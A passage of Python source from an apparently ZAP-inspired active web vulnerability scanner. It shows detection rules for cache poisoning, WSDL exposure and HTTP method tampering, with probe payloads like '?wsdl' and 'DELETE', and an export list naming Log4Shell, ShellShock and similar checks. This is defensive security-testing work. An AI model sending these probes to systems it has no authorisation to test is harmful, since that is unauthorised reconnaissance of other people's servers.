    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        body = response_body or ""
        # Check if our marker is reflected in response
        if self._MARKER in body and self._MARKER not in (baseline_body or ""):
            # Check if response is cached
            headers = response_headers or {}
            cache_indicators = any(
                k.lower() in ("x-cache", "cf-cache-status", "x-varnish", "age")
                for k in headers
            )
            if cache_indicators:
                return 0.85  # Reflected AND cached
            return 0.65  # Reflected in response (unkeyed header used)
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 25. WSDL/SOAP Endpoint Exposure (Custom, CWE-651)
# ═══════════════════════════════════════════════════════════════════════════════

class WSDLDisclosureRule(Rule):
    """Detect exposed WSDL/SOAP endpoints leaking internal service structure."""
    def __init__(self):
        super().__init__(
            id="wsdl_disclosure", name="WSDL/SOAP Endpoint Exposure",
            severity="MEDIUM", cvss=5.3, category="info",
            payloads=["?wsdl", "?WSDL", "?wsdl=1", "?xsd=1"],
            locations=["path_suffix"],
            remediation="Disable WSDL generation in production. Restrict access to WSDL endpoints. Use API gateways.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code != 200:
            return 0.0
        body = response_body or ""
        ct = (response_headers or {}).get("content-type", "").lower()
        if "xml" in ct or "wsdl" in ct:
            if re.search(r'<(?:wsdl:)?definitions|<(?:xs:)?schema|<wsdl:service', body, re.I):
                return 0.85
        if re.search(r'<(?:wsdl:)?definitions', body, re.I):
            return 0.80
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 26. HTTP Method Tampering (ZAP: TestHTTPMethodTampering 10058)
# ═══════════════════════════════════════════════════════════════════════════════

class HTTPMethodTamperingRule(Rule):
    """Detect if endpoints accept unexpected HTTP methods (PATCH/PUT/DELETE on GET endpoints)."""
    def __init__(self):
        super().__init__(
            id="http_method_tampering", name="HTTP Method Tampering",
            severity="MEDIUM", cvss=5.3, category="config",
            payloads=["PATCH", "PUT", "DELETE"],
            locations=["method"],
            remediation="Restrict HTTP methods to only those required. Return 405 Method Not Allowed for others.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # If an unexpected method returns 2xx (should be 405)
        if status_code in (200, 201, 204) and baseline_status in (200, 301, 302):
            body = response_body or ""
            sim = _text_similarity(body, baseline_body or "", payload)
            if sim > 0.70:
                return 0.55  # Accepts dangerous methods with similar response
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# EXPORT
# ═══════════════════════════════════════════════════════════════════════════════

ACTIVE_EXTRA_RULES = [
    RemoteFileIncludeRule,
    CodeInjectionRule,
    ServerSideIncludeRule,
    ForbiddenBypassRule,
    BufferOverflowRule,
    FormatStringRule,
    IntegerOverflowRule,
    GetForPostRule,
    SourceCodeDisclosureRule,
    HTTPParamPollutionRule,
    WebCacheDeceptionRule,
    EnvFileExposureRule,
    # New rules (13-26)
    ShellShockRule,
    Log4ShellRule,
    Spring4ShellRule,
    CloudMetadataRule,
    LDAPInjectionRule,
    PaddingOracleRule,
    HiddenFilesRule,
    TraceAxdRule,
    HtAccessRule,
    UserAgentFuzzerRule,
    RelativePathConfusionRule,
    CachePoisoningRule,
    WSDLDisclosureRule,
    HTTPMethodTamperingRule,
]

def get_active_extra_rules() -> list[Rule]:
    return [cls() for cls in ACTIVE_EXTRA_RULES]
